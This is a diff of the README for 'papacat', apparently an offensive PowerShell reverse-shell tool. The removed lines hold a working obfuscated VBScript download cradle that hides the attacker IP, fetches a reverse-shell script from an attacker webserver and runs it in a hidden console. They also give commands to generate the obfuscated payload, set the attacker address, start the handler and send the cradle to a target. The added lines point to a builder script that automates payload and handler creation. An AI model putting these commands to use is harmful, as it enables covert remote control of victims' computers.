@@ -102,67 +102,15 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 # Automation - Obfuscation ( @Meterpeter )
 
-<br />
-
-#### [update.vbs] download crandle
-```vbscript
-' Author: @r00t-3xp10it (ssa)
-' Application: papacat download crandle
-' Description:
-'   This VBS will download Trigger.ps1 (rev tcp shell) from attacker webserver
-'   imports module and executes module in a hidden console. ( background )
-' ---
-
-dIm Char,Cmd,Layback
-Char="@!COLOMBO@!"+":007:VIRIATO@!"+"NAVIGATOR@!"
-Layback=rEpLaCe(Char, "@!", ""):Cmd=rEpLaCe(Layback, ":007:", "")
-
-set ObjConsole = CreateObject("Wscript.Shell")
-ObjConsole.Run("powershell.exe cd $Env:TMP;iwr -Uri http://"+Cmd+"/Trigger.ps1 -OutFile Trigger.ps1;Import-Module -Name .\Trigger.ps1 -Force;Trigger-c Server@Local@host -e cmd.exe -p 666"), 0
-}
-```
+Builder.ps1 cmdlet automates the creation of papacat reverse tcp shell ( payload - handler )
+![https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
 
 <br />
 
 #### Download cmdlet
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/Builder.ps1" -OutFile "Builder.ps1"
 ```
-
-#### Generate - Cmd Client (payload) Obfucated
-```powershell
-Import-Module -Name .\papacat.ps1 -Force
-papacat -c 192.168.1.72 -e cmd.exe -p 666 -g > Trigger.ps1
-```
-
-<br />
-
-## The next section requires using terminal to execute commands ...
-- Get Local host adress to config the crandle
-- replace <b><i>8080</i></b> by <b><i>apache\http.server</i></b> port (webserver)
-```powershell
-$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
-$FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1   - COLOMBO
-$SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1    - VIRIATO
-$TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
-$LastRanges = "$TrithRange" + ":" + "8080" -join ''                    #.72:8080 - NAVIGATOR
-```
-- Replace the attacker ip addr (obfuscated\split) on vbs crandle
-```powershell
-((Get-Content -Path "update.vbs" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "update.vbs"
-((Get-Content -Path "update.vbs" -Raw) -Replace "COLOMBO","$FirstRange ")|Set-Content -Path "update.vbs"
-((Get-Content -Path "update.vbs" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "update.vbs" 
-((Get-Content -Path "update.vbs" -Raw) -Replace "Server@Local@host","$Local_Host")|Set-Content -Path "update.vbs" 
-``` 
-
-<br />
-
-- start the handler `Import-Module -Name .\papacat.ps1 -Force;papacat -l -p 666`
-- Store update.vbs + copy Trigger.ps1 on attacker webserver (port 8080)
-- send update.vbs url to target to trigger the client download (Trigger.ps1)
-- execute update.vbs on target machine to get the connection back
-
-![papacat](https://user-images.githubusercontent.com/23490060/155600050-539eeac6-26ee-46e0-a8eb-061daac5e38c.png)
 
 <br /><br />
 
